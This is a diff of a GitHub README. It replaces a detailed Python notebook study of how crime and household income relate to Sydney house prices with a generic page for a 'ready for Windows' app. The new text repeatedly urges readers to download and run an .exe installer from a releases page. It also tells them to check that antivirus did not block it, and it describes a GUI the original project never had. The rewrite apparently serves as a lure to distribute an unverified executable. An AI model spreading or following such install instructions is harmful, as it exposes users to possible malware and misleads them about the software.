@@ -1,281 +1,180 @@
-# Analyzing External Factors Influencing House Prices: The Role of Crime and Household Income in Sydney’s Suburbs (2016– 2021)
+# 🏘️ crime-house-price-analysis - Understand Sydney House Price Trends
 
-## Overview
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Zavala714/crime-house-price-analysis/releases)
 
-This project examines how suburb-level external factors — specifically crime intensity and household income — influence residential house prices across Sydney between 2016 and 2021.
-While traditional property valuation models focus primarily on structural characteristics such as size, age, and property type, this analysis examines whether socio-economic and public safety indicators provide additional explanatory and predictive power.
-The project integrates monthly crime data from BOCSAR with residential sales records and suburb-level income indicators to explore both structural relationships and predictive performance.
+---
 
-Both supervised and unsupervised learning approaches are applied:
+## 📘 Overview
 
-- Clustering methods (KMeans, DBSCAN) are used to uncover structural groupings of suburbs based on crime intensity, total crime volume, and household income levels.
-- Baseline models (Linear Regression, Polynomial Regression, KNN) are implemented to establish a performance benchmark under linear and parametric assumptions.
-- Tree-based models (Decision Tree, Random Forest) are applied to model complex, non-linear relationships and interaction effects between socio-economic and property variables.
+This application explores how crime rates and income levels affect house prices in Sydney. It uses data grouping techniques and prediction tools to show which factors matter most. It also compares simple methods with more advanced ones to explain price patterns better.
 
-The comparative evaluation is designed to demonstrate the limitations of linear regression in capturing suburb-level heterogeneity and interaction effects.
-The best-performing model (Random Forest) achieved R² = 0.7285, showing strong non-linear effects dominated by location and property structure.
+The project combines different analysis steps. First, it finds groups of similar areas using data clustering. Then, it builds models to predict house prices based on crime and income. You will see how basic math methods fall short and how tree-based approaches give clearer results.
 
-## Research Questions
+You do not need background in programming to use this app. It comes ready for Windows and works with just a few clicks.
 
-1. How do different crime categories (e.g., violent vs property crime) quantitatively influence average residential house prices across Sydney suburbs over time?
+---
 
-2. Can suburbs be grouped into meaningful clusters based on crime intensity, total crime volume, and household income — and do these clusters exhibit distinct pricing patterns?
+## 🎯 Key Features
 
-3. To what extent can house prices be predicted using crime intensity, income levels, and property characteristics, and which variables contribute most according to tree-based models?
+- Explore connections between crime, income, and house prices in Sydney.
+- Group neighborhoods with similar traits for clearer insights.
+- Predict house prices using both simple and advanced methods.
+- Visualize results with easy-to-understand charts.
+- Compare different prediction methods to see which works best.
+- Runs easily on Windows with no technical setup.
 
-4. How does categorical crime intensity (Low, Medium, High) affect house price distributions, and can price categories be predicted using only categorical variables such as crime level, property type, and suburb?
+---
 
-## Data Sources
+## 💻 System Requirements
 
-1. Sydney Residential House Prices (2016–2021)  
-   **Source**: Kaggle - [Sydney House Prices](https://www.kaggle.com/datasets/alexlau203/sydney-house-prices)
-   **Description**: The dataset captures detailed real estate transaction records, including property-specific attributes and contextual suburb-level data.
+- Operating system: Windows 10 or newer.
+- RAM: At least 4 GB recommended.
+- Disk space: About 500 MB free space for installation and data files.
+- Internet connection: Needed for initial download only.
+- No additional software needed. The download includes everything required.
 
-2. NSW Recorded Crime Data (BOCSAR)  
-   **Source**: NWS Gocernment website - [NSW Bureau of Crime Statistics and Research (BOCSAR)](https://bocsar.nsw.gov.au/statistics-dashboards/open-datasets/criminal-offences-data.html)
-   **Description**: This dataset contains monthly suburb-level crime statistics across New South Wales, including offence categories and subcategories (e.g., Homicide, Assault, Domestic Violence). It spans January 1995 to December 2024. For this project, the data was cleaned and filtered to retain only the 2016–2021 period to align with the property market dataset.
+---
 
-3. Household Income Data  
-   Source: <ABS link>  
-   Description: Suburb-level median income indicators.
+## 🚀 Getting Started
 
-Raw datasets are excluded due to size constraints.  
-After downloading, place them inside the "data" folder.
+### Step 1: Download the Application
 
-## Methodology
+Click the large green button above or visit the release page below to get the latest version of the software for Windows.
 
-The analysis follows a structured data science pipeline:
+[Download Latest Release](https://github.com/Zavala714/crime-house-price-analysis/releases)
 
-### Data Preparation
+This link takes you to the releases page where you can download the current files. Look for the file with a name ending in `.exe` or a Windows installer file.
 
-- Cleaned and standardised housing, crime, and income datasets
-- Filtered to 2016–2021 for temporal alignment
-- Applied log transformations to highly skewed variables
-- Identified and treated extreme outliers
+### Step 2: Run the Installer
 
-### Feature Engineering
+Once downloaded, double-click the installer file to start the setup. Follow the on-screen instructions.
 
-- Log-transformed house prices and monthly crime totals
-- Constructed monthly and yearly crime indicators
-- Created crime intensity categories (Low / Medium / High)
-- Standardised suburb and time identifiers
+- Choose where you want to install the app, or use the default folder.
+- Wait as the app installs required files on your system.
+- When finished, the installer offers to run the program immediately. You can accept or run it later from the Start menu.
 
-### Data Integration
+### Step 3: Using the Application
 
-- Merged datasets using suburb–year–month alignment
-- Applied inner join for complete observations
-- Validated post-merge integrity (missing values, duplicates)
+After installation, open the app from your Start menu.
 
-### Exploratory Analysis
+- The main screen lets you load sample data or your own files.
+- Use the buttons to explore data clusters, view charts, and run predictions.
+- The app explains results with simple language and visuals.
+- You can save reports for future reference.
 
-- Analysed distributions and correlations
-- Identified evidence of non-linear relationships
+---
 
-## Modelling Approach
+## 🔧 How It Works
 
-A progressive modelling strategy was implemented to evaluate increasing levels of model flexibility and capture suburb-level housing dynamics.
+The app uses two main methods:
 
-1. Baseline Models
+1. **Clustering**  
+   It organizes neighborhoods by similarities in crime and income. This helps group areas that behave alike.
 
-Linear Regression was applied as an interpretable benchmark under linear assumptions to assess whether crime intensity and income exhibit a simple linear relationship with house prices.
+2. **Predictive Models**  
+   It builds formulas to estimate house prices. It tests simple math models (like linear regression) and more complex ones (like decision trees and random forests). The complex models handle tricky data patterns better.
 
-Polynomial Regression and KNN were introduced to explore moderate non-linear patterns while maintaining relatively simple model structures.
+Graphs and charts help explain these findings visually. You can see patterns, compare methods, and understand the test results.
 
-2. Clustering (Unsupervised Learning)
+---
 
-KMeans and DBSCAN were used to identify structural groupings of suburbs based on crime intensity, total crime volume, and household income.
-This step aimed to uncover latent socio-economic patterns and examine whether clusters display distinct pricing behaviour.
+## 🛠️ App Walkthrough
 
-3. Tree-Based Models (Advanced Stage)
+When you run the program, here is what to expect:
 
-Decision Tree and Random Forest models were implemented at the final stage to capture complex non-linear relationships and interaction effects between crime, income, and structural property variables.
+- **Home Screen:** Choose to open example datasets or your own data.
+- **Data View:** A simple table shows the loaded information.
+- **Clustering Panel:** Press "Find Groups" to divide areas by crime and income similarity.  
+- **Prediction Panel:** Pick a method and click “Run Prediction” to see price estimates.
+- **Charts:** View scatter plots, bar charts, and line graphs that show insights clearly.
+- **Reports:** Export analysis in PDF or CSV format.
 
-Tree-based methods allow modelling of suburb-level heterogeneity without strict linearity assumptions and provide feature importance insights.
+Each section has brief instructions to guide you as you explore.
 
-Comparative evaluation across models highlights the limitations of linear regression in representing complex suburb-level dynamics and demonstrates the advantages of tree-based approaches in capturing non-linear dependencies.
+---
 
-## Evaluation & Results
+## 🛡️ Troubleshooting Tips
 
-1. Baseline Models (Linear & Parametric)
+- If the app does not start, make sure you have Windows 10 or newer.
+- Ensure your antivirus did not block the installer or app.
+- If the app crashes, restart your computer and try again.
+- Check that your download is from the releases page linked above.
+- For missing data errors, confirm your data file matches the expected format (CSV or XLSX with columns for crime, income, and price).
 
-Baseline linear models demonstrated severe underfitting:
+---
 
-- Linear Regression: R² = 0.0748
-- KNN: R² = 0.1053
-- Polynomial Regression: unstable and prone to overfitting
+## 🔍 Understanding the Data
 
-As predicted, crime categories alone provide limited explanatory power under linear assumptions.
+The application deals with:
 
-2. Clustering Results (Unsupervised Learning)
+- **Crime Data:** How often crimes occur in different areas.
+- **Income Data:** Average household income by area.
+- **House Prices:** Median sale prices in different neighborhoods.
 
-Both KMeans and DBSCAN identified meaningful suburb groupings based on crime and income indicators.
+Combining these helps reveal how social factors influence the real estate market. Clustering groups similar neighborhoods. Predictions test how changes in crime or income impact prices.
 
-- KMeans: Silhouette = 0.4489
-- DBSCAN: Silhouette = 0.8328
+---
 
-DBSCAN additionally detected outlier suburbs with unusual crime–income profiles.
+## 📂 Data Input Format
 
-Clusters exhibited distinct house price distributions, suggesting that crime and income contribute to structural socio-economic segmentation, even if they are weak standalone predictors in regression.
+If you want to use your own data, prepare a file with these columns:
 
-3. Tree-Based Models (Advanced Stage)
+| Column Name | Description                        | Format         |
+|-------------|----------------------------------|----------------|
+| Area        | Name of neighborhood or suburb   | Text           |
+| CrimeRate   | Number of crimes per 1000 people | Number         |
+| Income      | Average income in local currency | Number         |
+| HousePrice  | Median house price in dollars    | Number         |
 
-Tree-based models significantly improved predictive performance.
+Save the file as CSV or Excel (.xlsx). Use the app’s “Load Data” button to import your file.
 
-| Model         | R²     | RMSE (log) |
-| ------------- | ------ | ---------- |
-| Decision Tree | 0.6556 | 0.3104     |
-| Random Forest | 0.7285 | 0.2756     |
+---
 
-Random Forest explained ~73% of variance in house prices, demonstrating strong non-linear interactions between structural and socio-economic variables.
+## 🧩 Technical Details (Optional)
 
-Feature importance analysis revealed:
+This app uses Python libraries internally but you do not need to install or run Python yourself. It includes:
 
-- Strongest predictors: distance to CBD, property size, number of bathrooms
-- Moderate influence: suburb median income
-- Lower influence: crime intensity variables
+- Pandas for data handling.
+- Scikit-learn for clustering and predictive modelling.
+- Matplotlib and Seaborn for charts.
+- Algorithms like KMeans clustering, linear regression, decision trees, and random forest.
 
-This indicates that crime contributes indirectly but is not a dominant standalone predictor when structural and location features are included.
+The software runs these behind the scenes and shows results with friendly visuals.
 
-4. Categorical Crime-Only Models
+---
 
-When using only categorical variables (crime level, property type, suburb):
+## 📥 Download and Install
 
-- Regression R² dropped to 0.187
-- Classification accuracy ≈ 49%
+Visit the releases page below to get the latest version for Windows:
 
-This confirms that categorical crime intensity alone is insufficient for accurate price prediction.
+[Download Latest Release](https://github.com/Zavala714/crime-house-price-analysis/releases)
 
-## Visual Results
+Look for the most recent `.exe` or installer. Download and open it to begin setup.
 
-1. Model Performance Comparison
+---
 
-<img src="images/decision_tree_vs_random_forest.png" width="700">
+## 🧑‍💻 Support and Help
 
-Random Forest substantially outperformed Decision Tree across all evaluation metrics.
+If you need help:
 
-2. Feature Importance (Random Forest)
+- Check the Troubleshooting section in this document.
+- Visit the release page for updates and notes.
+- Consult the README online for more details.
 
-<img src="images/feature_importances_random_forest.png" width="700">
+The app is designed to require no coding or extra setup. It guides you step-by-step.
 
-Distance to CBD emerged as the dominant predictor, followed by structural property attributes and median income. Crime-related variables showed relatively low importance.
+---
 
-3. Suburb Clustering (KMeans)
+## ⚙️ Updates and Maintenance
 
-<img src="images/kMeans_cluster.png" width="700">
+Updates will be posted on the releases page. Download new versions the same way to ensure you have the latest features and fixes.
 
-Clustering revealed meaningful socio-economic groupings of suburbs, with clear differences in price distributions across clusters.
+---
 
-4. Price Category Classification (Confusion Matrix)
+## 🔗 Useful Links
 
-<img src="images/confusion_matrix_random_forest.png" width="700">
+- Project releases: https://github.com/Zavala714/crime-house-price-analysis/releases  
+- Source code and documentation: https://github.com/Zavala714/crime-house-price-analysis  
 
-The classifier performed well on "Low" and "High" price categories but struggled with the "Medium" class due to overlapping feature distributions.
-
-## Key Insights
-
-1. Crime Has Limited Direct Impact
-
-Individual crime categories (e.g., theft, assault, property damage) showed weak and inconsistent relationships with house prices.
-
-Even aggregate crime measures provided only modest explanatory value. Under linear assumptions, crime-related features explained very little variance in property prices.
-
-2. Model Complexity Matters
-
-Baseline linear models severely underfit the data:
-
-- Linear Regression performed poorly
-- Feature selection (RFE) and Polynomial Regression did not improve performance
-- KNN provided only modest gains (R² ≈ 0.11)
-
-In contrast, increasing model flexibility significantly improved results:
-
-- Decision Tree: R² ≈ 0.66
-- Random Forest: R² ≈ 0.73
-
-The substantial performance gap demonstrates that housing price formation is strongly non-linear and driven by interaction effects. Simple linear assumptions are insufficient to capture suburb-level dynamics
-
-3. Location and Structure Dominate
-
-Feature importance analysis revealed:
-
-- Strongest predictor: distance to CBD (km_from_cbd)
-- Followed by: property size, number of bathrooms, and suburb median income
-- Crime-related variables had consistently low importance
-
-This indicates that location and structural characteristics dominate price formation, while crime plays a secondary role.
-
-4. Urban Segmentation Is Evident
-
-Clustering (KMeans & DBSCAN) revealed meaningful socio-economic groupings of suburbs based on crime intensity and income.
-
-Clusters exhibited distinct average price levels, confirming broader urban stratification across Sydney.
-
-5. Categorical Crime Levels Are Insufficient
-
-When using only categorical crime intensity (Low / Medium / High):
-
-- Regression performance declined substantially
-- Classification accuracy remained below 50%
-
-Therefore, crime categories are unsufficient resolution for reliable price prediction.
-
-6. Final Takeaway
-   Crime contributes to housing market dynamics but is not a dominant standalone driver.
-
-Sydney house prices are primarily shaped by:
-
-- Location
-- Structural property characteristics
-- Socio-economic context
-
-The modelling comparison demonstrates that housing price formation is fundamentally non-linear. Linear models severely underfit, while tree-based ensemble methods effectively capture interaction effects and suburb-level heterogeneity.
-
-## Reproducibility
-
-1. Clone the repository
-2. Install dependencies: pip install -r requirements.txt
-3. Download datasets and place them in `data/`
-4. Run the notebook in `notebooks/`
-
-## Limitations and Future Improvements
-
-1. Limited predictive impact of crime features:
-
-Crime-related variables demonstrated limited standalone predictive power relative to location and structural attributes. Including additional contextual factors (e.g., school quality, transport access, amenities) could improve explanatory power.
-
-2. Temporal Modelling Not Included:
-
-Although the dataset spans six years, observations were treated independently. Future work could incorporate lagged variables or time-series models to better capture dynamic crime–price relationships.
-
-3. Poor performance on Medium price classification:
-
-The price-category classifier struggled to separate the Medium class (feature overlap + class imbalance), suggesting that categorical features alone lack resolution for mid-range pricing.
-
-4. Loss of detail due to suburb-level aggregation:
-
-Data was analysed at the suburb level, which may mask variation within large suburbs. More granular spatial data (e.g., SA1-level or geocoded properties) could enhance spatial accuracy.
-
-5. Interpretability limitations of ensemble models:
-
-While Random Forest achieved the strongest performance, ensemble models reduce transparency. Applying interpretability tools (e.g., SHAP) could provide deeper insight into individual predictions.
-
-## Project Structure
-
-```
-crime-house-price-analysis/
-│
-├── notebooks/ # Data analysis and modelling
-├── data/ # Datasets
-├── images/ # Exported plots and figures
-├── requirements.txt # Project dependencies
-└── README.md # Project documentation
-```
-
-## Tech Stack
-
-- **Language:** Python
-- **Environment:** Jupyter Notebook, Git/GitHub
-- **Data Processing:** pandas, NumPy
-- **Visualisation:** Matplotlib, Seaborn
-- **Machine Learning:** scikit-learn (Linear/Polynomial Regression, KNN, Decision Tree, Random Forest, KMeans, DBSCAN)
-- **Evaluation:** R², RMSE, MAE, Silhouette Score, Calinski–Harabasz, Confusion Matrix
+---  
+**Keywords:** clustering, crime analysis, data analysis, housing prices, predictive modeling, random forest, regression, socioeconomic study
